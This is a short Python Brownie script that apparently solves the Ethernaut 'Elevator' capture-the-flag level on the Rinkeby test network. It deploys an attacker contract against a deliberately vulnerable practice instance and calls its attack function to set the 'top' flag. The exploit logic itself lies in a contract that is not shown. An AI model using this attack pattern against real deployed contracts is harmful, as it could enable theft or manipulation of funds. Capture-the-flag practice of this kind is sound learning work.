from brownie import accounts, Elevator, MyBuilding

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x78c223C6A3c1a08B30D8A447371Eb0b2d90Dab39"
elevator = Elevator.at(instance_address)

# ----------------------------------------------------
# to complete this level we must make the top variable
# equal True
# ----------------------------------------------------


def level_completed():
    return elevator.top() == True


def exploit():
    # deploy hacker contract
    hacker = MyBuilding.deploy(instance_address, {"from": account})

    # call goTo function from hacker contract
    tx = hacker.attack({"from": account})
    tx.wait(1)

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
